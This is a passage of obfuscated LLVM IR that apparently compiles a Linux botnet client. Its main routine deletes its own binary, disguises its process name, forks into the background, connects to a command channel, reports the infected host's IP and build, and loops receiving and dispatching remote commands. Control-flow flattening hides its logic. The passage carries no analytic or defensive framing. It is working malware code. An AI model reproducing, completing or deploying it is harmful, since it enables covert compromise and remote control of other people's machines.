  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca [32 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @unlink(i8* %27) #3
  call void @rand_init()
  %29 = call i32 @rand_next()
  %30 = urem i32 %29, 4
  %31 = add i32 %30, 3
  %32 = mul i32 %31, 4
  store i32 %32, i32* %8, align 4
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %34 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %33, i32 %34)
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %42 = call i32 @util_strcpy(i8* %40, i8* %41)
  %43 = call i32 @rand_next()
  %44 = urem i32 %43, 6
  %45 = add i32 %44, 3
  %46 = mul i32 %45, 4
  store i32 %46, i32* %8, align 4
  %47 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %48 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %47, i32 %48)
  %49 = load i32, i32* %8, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %50
  store i8 0, i8* %51, align 1
  %52 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %53 = call i32 (i32, ...) @prctl(i32 15, i8* %52) #3
  %54 = call i64 @time(i64* null) #3
  %55 = call i32 @getpid() #3
  %56 = sext i32 %55 to i64
  %57 = xor i64 %54, %56
  %58 = trunc i64 %57 to i32
  call void @srand(i32 %58) #3
  call void @rand_init()
  %59 = call i32 @getOurIP()
  %60 = call i32 @fork() #3
  store i32 %60, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1229667270, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1229667270, label %first
    i32 259275008, label %63
    i32 58426631, label %66
    i32 1108294462, label %70
    i32 -784750622, label %74
    i32 -2090941615, label %75
    i32 -895972046, label %79
    i32 -1051273313, label %80
    i32 1840071666, label %81
    i32 2017865452, label %82
    i32 2094757629, label %83
    i32 1808391787, label %84
    i32 -2082312263, label %85
    i32 1313981938, label %88
    i32 -1293189693, label %92
    i32 433745002, label %93
    i32 1065510725, label %101
    i32 -1320402421, label %107
    i32 -848780392, label %108
    i32 110465212, label %114
    i32 -611243212, label %123
    i32 -1165234584, label %126
    i32 1499328331, label %132
    i32 1534009453, label %143
    i32 1821846187, label %146
    i32 2061543897, label %159
    i32 771544179, label %165
    i32 -1830472187, label %175
    i32 -923820507, label %178
    i32 1230280622, label %182
    i32 232858326, label %183
    i32 -1004948034, label %186
    i32 -1167417576, label %197
    i32 -167969327, label %200
    i32 -1631977364, label %206
    i32 1555805319, label %211
    i32 2074895493, label %213
    i32 1852670450, label %216
    i32 943779307, label %222
    i32 -621017666, label %223
    i32 2080890552, label %232
    i32 -634690083, label %242
    i32 -972412072, label %251
    i32 -1454162759, label %253
    i32 914848751, label %259
    i32 -1163837240, label %261
    i32 918833823, label %267
    i32 -55468896, label %272
    i32 -1646061583, label %274
    i32 1954079037, label %277
    i32 -1266691982, label %282
    i32 -264857101, label %287
    i32 774796294, label %296
    i32 379706425, label %301
    i32 -46912194, label %305
    i32 1857575200, label %311
    i32 374067258, label %334
    i32 896992950, label %336
    i32 1184945753, label %342
    i32 1783496551, label %343
    i32 -1358271445, label %348
    i32 1842052940, label %353
    i32 -2100879319, label %356
    i32 -1976079637, label %357
    i32 -2102455532, label %358
    i32 1121278380, label %359
    i32 -552851037, label %360
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %61 = icmp ne i32 %.reload, 0
  %62 = select i1 %61, i32 259275008, i32 58426631
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %9, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %11, i32 0)
  call void @exit(i32 0) #11
  unreachable

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %9, align 4
  %68 = icmp ne i32 %67, 0
  %69 = select i1 %68, i32 2094757629, i32 1108294462
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = call i32 @fork() #3
  store i32 %71, i32* %10, align 4
  %72 = icmp ne i32 %71, 0
  %73 = select i1 %72, i32 -784750622, i32 -2090941615
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  call void @exit(i32 0) #11
  unreachable

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %10, align 4
  %77 = icmp ne i32 %76, 0
  %78 = select i1 %77, i32 -1051273313, i32 -895972046
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 1840071666, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1840071666, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 2017865452, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  store i32 1808391787, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 1808391787, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 -2082312263, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0)) #3
  %87 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  store i32 1313981938, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = call i32 @initConnection()
  %90 = icmp ne i32 %89, 0
  %91 = select i1 %90, i32 -1293189693, i32 433745002
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 1313981938, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* @KadenCommStock, align 4
  %95 = call i8* @getBuildz()
  %96 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %97 = call i8* @inet_ntoa(i32 %96) #3
  %98 = call i8* @getBuild()
  %99 = call i32 @getEndianness()
  %100 = call i32 (i32, i8*, ...) @botnetPrint(i32 %94, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.170, i32 0, i32 0), i8* %95, i8* %97, i8* %98, i32 %99, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0))
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 1065510725, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* @KadenCommStock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  %104 = call i32 @recvLine(i32 %102, i8* %103, i32 4096)
  store i32 %104, i32* %13, align 4
  %105 = icmp ne i32 %104, -1
  %106 = select i1 %105, i32 -1320402421, i32 1121278380
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 -848780392, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %14, align 4
  %110 = sext i32 %109 to i64
  %111 = load i64, i64* @numpids, align 8
  %112 = icmp ult i64 %110, %111
  %113 = select i1 %112, i32 110465212, i32 -1004948034
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32*, i32** @pids, align 8
  %116 = load i32, i32* %14, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = call i32 @waitpid(i32 %119, i32* null, i32 1)
  %121 = icmp sgt i32 %120, 0
  %122 = select i1 %121, i32 -611243212, i32 1230280622
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %14, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %16, align 4
  store i32 -1165234584, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* %16, align 4
  %128 = zext i32 %127 to i64
  %129 = load i64, i64* @numpids, align 8
  %130 = icmp ult i64 %128, %129
  %131 = select i1 %130, i32 1499328331, i32 1821846187
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32*, i32** @pids, align 8
  %134 = load i32, i32* %16, align 4
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %133, i64 %135
  %137 = load i32, i32* %136, align 4
  %138 = load i32*, i32** @pids, align 8
  %139 = load i32, i32* %16, align 4
  %140 = sub i32 %139, 1
  %141 = zext i32 %140 to i64
  %142 = getelementptr inbounds i32, i32* %138, i64 %141
  store i32 %137, i32* %142, align 4
  store i32 1534009453, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* %16, align 4
  %145 = add i32 %144, 1
  store i32 %145, i32* %16, align 4
  store i32 -1165234584, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %16, align 4
  %149 = sub i32 %148, 1
  %150 = zext i32 %149 to i64
  %151 = getelementptr inbounds i32, i32* %147, i64 %150
  store i32 0, i32* %151, align 4
  %152 = load i64, i64* @numpids, align 8
  %153 = add i64 %152, -1
  store i64 %153, i64* @numpids, align 8
  %154 = load i64, i64* @numpids, align 8
  %155 = add i64 %154, 1
  %156 = mul i64 %155, 4
  %157 = call noalias i8* @malloc(i64 %156) #3
  %158 = bitcast i8* %157 to i32*
  store i32* %158, i32** %15, align 8
  store i32 0, i32* %16, align 4
  store i32 2061543897, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32, i32* %16, align 4
  %161 = zext i32 %160 to i64
  %162 = load i64, i64* @numpids, align 8
  %163 = icmp ult i64 %161, %162
  %164 = select i1 %163, i32 771544179, i32 -923820507
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32*, i32** @pids, align 8
  %167 = load i32, i32* %16, align 4
  %168 = zext i32 %167 to i64
  %169 = getelementptr inbounds i32, i32* %166, i64 %168
  %170 = load i32, i32* %169, align 4
  %171 = load i32*, i32** %15, align 8
  %172 = load i32, i32* %16, align 4
  %173 = zext i32 %172 to i64
  %174 = getelementptr inbounds i32, i32* %171, i64 %173
  store i32 %170, i32* %174, align 4
  store i32 -1830472187, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i32, i32* %16, align 4
  %177 = add i32 %176, 1
  store i32 %177, i32* %16, align 4
  store i32 2061543897, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32*, i32** @pids, align 8
  %180 = bitcast i32* %179 to i8*
  call void @free(i8* %180) #3
  %181 = load i32*, i32** %15, align 8
  store i32* %181, i32** @pids, align 8
  store i32 1230280622, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 232858326, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %14, align 4
  %185 = add nsw i32 %184, 1
  store i32 %185, i32* %14, align 4
  store i32 -848780392, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* %13, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 %188
  store i8 0, i8* %189, align 1
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  call void @trim(i8* %190)
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  store i8* %191, i8** %17, align 8
  %192 = load i8*, i8** %17, align 8
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 33
  %196 = select i1 %195, i32 -1167417576, i32 -2102455532
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %17, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  store i8* %199, i8** %18, align 8
  store i32 -167969327, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8*, i8** %18, align 8
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp ne i32 %203, 32
  %205 = select i1 %204, i32 -1631977364, i32 1555805319
  store i32 %205, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8*, i8** %18, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp ne i32 %209, 0
  store i32 1555805319, i32* %switchVar
  store i1 %210, i1* %.reg2mem3
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %212 = select i1 %.reload4, i32 2074895493, i32 1852670450
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8*, i8** %18, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %18, align 8
  store i32 -167969327, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %18, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 0
  %221 = select i1 %220, i32 943779307, i32 -621017666
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 1065510725, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %18, align 8
  store i8 0, i8* %224, align 1
  %225 = load i8*, i8** %17, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 1
  store i8* %226, i8** %18, align 8
  %227 = load i8*, i8** %17, align 8
  %228 = load i8*, i8** %18, align 8
  %229 = call i64 @strlen(i8* %228) #9
  %230 = getelementptr inbounds i8, i8* %227, i64 %229
  %231 = getelementptr inbounds i8, i8* %230, i64 2
  store i8* %231, i8** %17, align 8
  store i32 2080890552, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8*, i8** %17, align 8
  %234 = load i8*, i8** %17, align 8
  %235 = call i64 @strlen(i8* %234) #9
  %236 = sub i64 %235, 1
  %237 = getelementptr inbounds i8, i8* %233, i64 %236
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 10
  %241 = select i1 %240, i32 -972412072, i32 -634690083
  store i32 %241, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8*, i8** %17, align 8
  %244 = load i8*, i8** %17, align 8
  %245 = call i64 @strlen(i8* %244) #9
  %246 = sub i64 %245, 1
  %247 = getelementptr inbounds i8, i8* %243, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 13
  store i32 -972412072, i32* %switchVar
  store i1 %250, i1* %.reg2mem5
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %252 = select i1 %.reload6, i32 -1454162759, i32 914848751
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8*, i8** %17, align 8
  %255 = load i8*, i8** %17, align 8
  %256 = call i64 @strlen(i8* %255) #9
  %257 = sub i64 %256, 1
  %258 = getelementptr inbounds i8, i8* %254, i64 %257
  store i8 0, i8* %258, align 1
  store i32 2080890552, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8*, i8** %17, align 8
  store i8* %260, i8** %19, align 8
  store i32 -1163837240, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8*, i8** %17, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 32
  %266 = select i1 %265, i32 918833823, i32 -55468896
  store i32 %266, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %17, align 8
  %269 = load i8, i8* %268, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp ne i32 %270, 0
  store i32 -55468896, i32* %switchVar
  store i1 %271, i1* %.reg2mem7
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %273 = select i1 %.reload8, i32 -1646061583, i32 1954079037
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8*, i8** %17, align 8
  %276 = getelementptr inbounds i8, i8* %275, i32 1
  store i8* %276, i8** %17, align 8
  store i32 -1163837240, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %17, align 8
  store i8 0, i8* %278, align 1
  %279 = load i8*, i8** %17, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %17, align 8
  %281 = load i8*, i8** %19, align 8
  store i8* %281, i8** %20, align 8
  store i32 -1266691982, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8*, i8** %20, align 8
  %284 = load i8, i8* %283, align 1
  %285 = icmp ne i8 %284, 0
  %286 = select i1 %285, i32 -264857101, i32 774796294
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %20, align 8
  %289 = load i8, i8* %288, align 1
  %290 = zext i8 %289 to i32
  %291 = call i32 @toupper(i32 %290) #9
  %292 = trunc i32 %291 to i8
  %293 = load i8*, i8** %20, align 8
  store i8 %292, i8* %293, align 1
  %294 = load i8*, i8** %20, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %20, align 8
  store i32 -1266691982, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  %297 = load i8*, i8** %17, align 8
  %298 = call i8* @strtok(i8* %297, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0)) #3
  store i8* %298, i8** %23, align 8
  %299 = load i8*, i8** %19, align 8
  %300 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %299, i8** %300, align 16
  store i32 379706425, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i8*, i8** %23, align 8
  %303 = icmp ne i8* %302, null
  %304 = select i1 %303, i32 -46912194, i32 896992950
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %23, align 8
  %307 = load i8, i8* %306, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp ne i32 %308, 10
  %310 = select i1 %309, i32 1857575200, i32 374067258
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8*, i8** %23, align 8
  %313 = call i64 @strlen(i8* %312) #9
  %314 = add i64 %313, 1
  %315 = call noalias i8* @malloc(i64 %314) #3
  %316 = load i32, i32* %22, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %317
  store i8* %315, i8** %318, align 8
  %319 = load i32, i32* %22, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %320
  %322 = load i8*, i8** %321, align 8
  %323 = load i8*, i8** %23, align 8
  %324 = call i64 @strlen(i8* %323) #9
  %325 = add i64 %324, 1
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 %325, i32 1, i1 false)
  %326 = load i32, i32* %22, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %327
  %329 = load i8*, i8** %328, align 8
  %330 = load i8*, i8** %23, align 8
  %331 = call i8* @strcpy(i8* %329, i8* %330) #3
  %332 = load i32, i32* %22, align 4
  %333 = add nsw i32 %332, 1
  store i32 %333, i32* %22, align 4
  store i32 374067258, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0)) #3
  store i8* %335, i8** %23, align 8
  store i32 379706425, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %22, align 4
  %338 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %337, i8** %338)
  %339 = load i32, i32* %22, align 4
  %340 = icmp sgt i32 %339, 1
  %341 = select i1 %340, i32 1184945753, i32 -1976079637
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  store i32 1783496551, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = load i32, i32* %24, align 4
  %345 = load i32, i32* %22, align 4
  %346 = icmp slt i32 %344, %345
  %347 = select i1 %346, i32 -1358271445, i32 -2100879319
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %24, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %350
  %352 = load i8*, i8** %351, align 8
  call void @free(i8* %352) #3
  store i32 1842052940, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i32, i32* %24, align 4
  %355 = add nsw i32 %354, 1
  store i32 %355, i32* %24, align 4
  store i32 1783496551, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  store i32 -1976079637, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  store i32 -2102455532, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 1065510725, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 1313981938, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i32, i32* %3, align 4
  ret i32 %361

loopEnd:                                          ; preds = %359, %358, %357, %356, %353, %348, %343, %342, %336, %334, %311, %305, %301, %296, %287, %282, %277, %274, %272, %267, %261, %259, %253, %251, %242, %232, %223, %222, %216, %213, %211, %206, %200, %197, %186, %183, %182, %178, %175, %165, %159, %146, %143, %132, %126, %123, %114, %108, %107, %101, %93, %92, %88, %85, %84, %83, %82, %81, %80, %79, %75, %70, %66, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2085936283, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2085936283, label %first
    i32 -840339840, label %16
    i32 -679240278, label %18
    i32 805320028, label %23
    i32 1899665077, label %26
    i32 -1212872072, label %29
    i32 -1232743828, label %34
    i32 1382994804, label %35
    i32 645165975, label %39
    i32 -2078638704, label %44
    i32 121778582, label %45
    i32 -1533205366, label %46
    i32 -269898072, label %51
    i32 846328277, label %52
    i32 649320551, label %56
    i32 494210937, label %61
    i32 -2091659072, label %64
    i32 -693330949, label %65
    i32 1199667868, label %66
    i32 1258690099, label %71
    i32 -1212065483, label %78
    i32 -1385688322, label %81
    i32 293551496, label %82
    i32 -638246056, label %86
    i32 -1936500475, label %91
    i32 -554426172, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -840339840, i32 -1533205366
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -679240278, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 805320028, i32 -1212872072
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 1899665077, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -679240278, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1232743828, i32 1382994804
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 645165975, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 645165975, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -2078638704, i32 121778582
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 121778582, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1533205366, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
